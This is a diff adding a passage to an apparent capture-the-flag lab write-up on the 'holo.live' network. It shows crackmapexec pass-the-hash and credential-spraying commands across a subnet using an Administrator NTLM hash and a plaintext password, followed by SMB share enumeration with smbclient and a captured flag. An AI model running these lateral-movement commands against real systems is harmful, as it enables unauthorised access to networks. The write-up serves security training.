@@ -131,3 +131,37 @@ group:[Enterprise Key Admins] rid:[0x20f]
 group:[DnsUpdateProxy] rid:[0x456]
 ```
 
+
+So from the data we have gathered it's either Relay attack or Pass the hash
+
+```
+crackmapexec smb 10.201.11.0/24 -u Administrator -d . -H 3179c8ec65934b8d33ac9ec2a9d93400
+```
+
+```
+crackmapexec smb 10.201.11.0/24  -u 'watamet' -p 'Nothingtoworry!'
+```
+
+![[Pasted image 20240830142532.png]]
+
+```
+crackmapexec smb 10.201.11.35 -u 'watamet' -p 'Nothingtoworry!' --shares
+```
+![[Pasted image 20240830142737.png]]
+
+```
+smbclient //10.201.11.35/Users -U watamet --password='Nothingtoworry!'
+```
+
+The above command didn't worked
+
+```
+smbclient //10.201.11.35/Users -U watamet -W holo.live
+```
+![[Pasted image 20240830143400.png]]
+
+
+```
+HOLO{2cb097ab8c412d565ec3cab49c6b082e} 
+```
+
